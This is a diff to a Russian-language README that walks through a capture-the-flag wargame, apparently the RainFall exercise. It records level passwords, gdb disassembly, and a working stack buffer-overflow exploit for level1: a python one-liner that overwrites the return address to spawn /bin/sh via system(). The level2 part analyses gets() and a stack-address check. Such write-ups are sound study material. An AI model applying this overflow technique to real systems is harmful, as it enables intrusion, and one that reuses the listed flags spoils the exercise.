@@ -36,8 +36,8 @@ bonu0 bonu1 bonu02 bonu3 end
 | Пользователь           | Уязвимость | Инструмент | Пароль от следующего пользователя  |  
 | ---------------------- | ---------- | -----------| ----------------------:|
 | [level0](#lvl0)        |  | gdb |  1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a |
-| [level1](#lvl1)        | <p>NX disabled;</p><p>использование функции gets() </p>  |<p>поиск слабого места: gdb;</p> <p>взлом: верно подать в программу агумент с исполняемым кодом</p>|  |
-| [level2](#lvl2)        |  |  |  |
+| [level1](#lvl1)        | <p>NX disabled;</p><p>использование функции gets(), наличие в коде функции system() </p> | <p>Работа со стеком. </p> <br> <p>поиск слабого места: gdb;</p> <p>взлом: переполнение буфера и подмена EIP регистра (адрес возврата из функции) для исполнения функции system() </p>| 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 |
+| [level2](#lvl2)        | при ASLR off [Off-by-One](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/) (на основе кучи), можно также [Use-After-Free](https://habr.com/ru/company/otus/blog/516150/). Использование функции gets() | <p>Работа с кучей. </p> <br> ltrace, getfacl, gdb |  |
 | [level3](#lvl3)        |  |  |  |
 | [level4](#lvl4)        |  |  |  |
 | [level5](#lvl5)        |  |  |  |
@@ -290,7 +290,7 @@ NX disabled + No canary found + NO PIE + gets(), в которую подан а
 
 [ссылка о работе стека.](https://www.opennet.ru/base/dev/stack_intro.txt.html)
 
-gets() не проверяет длину поданной строки. И в этом уязвимость функции - можно переполнить буфер и положить вредоносный код (эксплоит).
+gets() не проверяет длину поданной строки. И в этом уязвимость функции - можно переполнить буфер и положить вредоносный код (эксплоит) - в данном случае прыгнуть на system().
 
 ```sh
 gdb -batch -ex 'file ./level1' -ex 'disas main'
@@ -328,7 +328,7 @@ EBP значение ESP <br>
 Последнее:
 `0x08048495 <+21>:    leave  ` <br>
 Инструкция leave равносильна двум инструкциям <br>
-1: `mov esp,ebp` вершина стрека указывает на значение, которое занимала перед входом в функцию main <br>
+1: `mov esp,ebp` вершина стека указывает на значение, которое занимала перед входом в функцию main <br>
 2: `pop ebp` ebp опять принимает значение ebp вызывающей функции. <br>
 `0x08048496 <+22>:    ret    `
 инструкция ret верхнее значение стека присваивает регистру eip, [предполагая, что это сохраненный адрес возврата в вызывающую функцию, переходит по этому адресу](https://snovvcrash.rocks/2019/10/20/classic-stack-overflow.html).
@@ -363,15 +363,24 @@ disassemble TAB
 # frame_dummy
 # ...
 ```
-среди функций есть system(). Нахожу функцию, которая ее вызывает (в main не было такой). Нахожу в run:
+среди функций есть system().
+Если прыгнуть сразу на system(), то оболочка не откроется, так как для открытия оболочки этой функции необходим аргумент `/bin/sh`. Для вызова system() с нужным аргументом нахожу функцию, которая ее вызывает (в main не было такой). Нахожу в run:
 ```sh
 gdb -batch -ex 'file ./level1' -ex 'disassemble run' | grep system
 # || 
 # \/
 #  0x08048479 <+53>:    call   0x8048360 <system@plt>
 ```
-Отлично. \
-Теперь нужно подать вместо адреса возврата в main адрес перед вызовом system(), то есть любой (включая адрес самой функции run(0)) до system() внутри run():
+Отлично. Это то, что нужно. \
+`0x08048472 <+46>:    movl   $0x8048584,(%esp)` кладет `/bin/sh` в аргумент для system() \
+`0x08048479 <+53>:    call   0x8048360 <system@plt>` вызов system() c `/bin/sh`
+
+Посмотреть содержимое переменной: 
+```
+(gdb) x 0x8048584
+0x8048584:       "/bin/sh"
+```
+Теперь нужно подать вместо адреса возврата в main адрес `0x08048472 <+46>:    movl   $0x8048584,(%esp)`, либо любой, после которого я попадаю на эту строку внутри run():
 ```sh
 gdb
 (gdb) disassemble run
@@ -388,7 +397,6 @@ gdb
 #    0x0804845a <+22>:    movl   $0x13,0x8(%esp)
 #    0x08048462 <+30>:    movl   $0x1,0x4(%esp)
 #    0x0804846a <+38>:    mov    %eax,(%esp)
-# ---Type <return> to continue, or q <return> to quit---
 #    0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
 #    0x08048472 <+46>:    movl   $0x8048584,(%esp)
 #    0x08048479 <+53>:    call   0x8048360 <system@plt>
@@ -410,9 +418,7 @@ gdb
 0x0804846d \
 0x08048472 
 
-Я возьму на строку выше, чем system(): \
-0x08048472 <+46>:    movl   $0x8048584,(%esp) \
-
+Я возьму 0x08048472 на строку выше, чем system(): 
 ```sh
 #                                       0x08048472
 (echo $(python -c 'print "a" * 76 + "\x72\x84\x04\x08"'); cat) | ./level1
@@ -442,6 +448,131 @@ RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH   
 <font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level2/level2</font>
 </pre> -->
 ![level2](./README/level2.png)
+
+```sh
+ls -la
+# ||
+# \/
+# -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
+
+getfacl level2 
+# ||
+# \/
+# # file: level2
+# # owner: level3
+# # group: users
+# # flags: ss-
+# user::rwx
+# user:level2:r-x
+# user:level3:r-x
+# group::---
+# mask::r-x
+# other::---
+
+./level2 
+# ||
+# \/
+# 
+# 
+./level2 
+# ||
+# \/
+# sdgsdg
+# sdgsdg
+
+ltrace ./level2 
+# ||
+# \/
+# __libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
+# fflush(0xb7fd1a20)                                                             = 0
+# gets(0xbffff5fc, 0, 0, 0xb7e5ec73, 0x80482b5 12345678Hello
+# )                                  = 0xbffff5fc
+# puts(" 12345678Hello" 12345678Hello
+# )                                                         = 15
+# strdup(" 12345678Hello")                                                       = 0x0804a008
+# +++ exited (status 8) +++
+
+(gdb) disassemble Tab
+# ||
+# \/
+# main p printf puts fflush strdup gets
+# ...
+
+(gdb) disassemble main
+# ||
+# \/
+# Dump of assembler code for function main:
+#    0x0804853f <+0>:     push   %ebp
+#    0x08048540 <+1>:     mov    %esp,%ebp
+#    0x08048542 <+3>:     and    $0xfffffff0,%esp
+#    0x08048545 <+6>:     call   0x80484d4 <p>
+#    0x0804854a <+11>:    leave  
+#    0x0804854b <+12>:    ret    
+# End of assembler dump.
+```
+main только вызывает p()
+
+```sh
+(gdb) disassemble p
+# ||
+# \/
+# Dump of assembler code for function p:
+#    0x080484d4 <+0>:     push   %ebp
+#    0x080484d5 <+1>:     mov    %esp,%ebp
+#    0x080484d7 <+3>:     sub    $0x68,%esp
+#    0x080484da <+6>:     mov    0x8049860,%eax
+#    0x080484df <+11>:    mov    %eax,(%esp)
+#    0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
+#    0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
+#    0x080484ea <+22>:    mov    %eax,(%esp)
+#    0x080484ed <+25>:    call   0x80483c0 <gets@plt>
+#    0x080484f2 <+30>:    mov    0x4(%ebp),%eax
+#    0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
+#    0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
+#    0x080484fb <+39>:    and    $0xb0000000,%eax
+#    0x08048500 <+44>:    cmp    $0xb0000000,%eax
+# ---Type <return> to continue, or q <return> to quit---
+#    0x08048505 <+49>:    jne    0x8048527 <p+83>
+#    0x08048507 <+51>:    mov    $0x8048620,%eax
+#    0x0804850c <+56>:    mov    -0xc(%ebp),%edx
+#    0x0804850f <+59>:    mov    %edx,0x4(%esp)
+#    0x08048513 <+63>:    mov    %eax,(%esp)
+#    0x08048516 <+66>:    call   0x80483a0 <printf@plt>
+#    0x0804851b <+71>:    movl   $0x1,(%esp)
+#    0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
+#    0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
+#    0x0804852a <+86>:    mov    %eax,(%esp)
+#    0x0804852d <+89>:    call   0x80483f0 <puts@plt>
+#    0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
+#    0x08048535 <+97>:    mov    %eax,(%esp)
+#    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+#    0x0804853d <+105>:   leave  
+# ---Type <return> to continue, or q <return> to quit---
+#    0x0804853e <+106>:   ret    
+# End of assembler dump.
+```
+
+`0x080484ed <+25>:    call   0x80483c0 <gets@plt>` p содержит gets(), в то же время содержит защиту от переполнения буфера на случай перезаписи eip регистра (адреса возврата из фукнции) и использования вредоносного кода в стеке (shell-кода, адреса другой функции для взлома) и в переменных окружения (адрес стека):
+```
+0x080484fb <+39>:    and    $0xb0000000,%eax           
+0x08048500 <+44>:    cmp    $0xb0000000,%eax           
+
+0x08048505 <+49>:    jne    0x8048527 <p+83>           
+...                                                    
+0x08048522 <+78>:    call   0x80483d0 <_exit@plt>      
+```
+<details> 
+  <summary> В развороте, как узнать адрес стека и почему именно 0xb0000000) </summary>
+
+`gdb level2`      <br>
+`b *0x08048486`   <br>
+`x/64wx $esp-132` <br>
+эти три команды в дебагере выведут значения в стеке по конкретным адресам - все адреса на 0xb... начинаются, значит здесь нам не позволят вредоносный код в стеке выполнить.
+
+
+
+Уязвимость Use-After-Free
+https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/
 
 #
 ###### [вернуться к содержанию](#content)
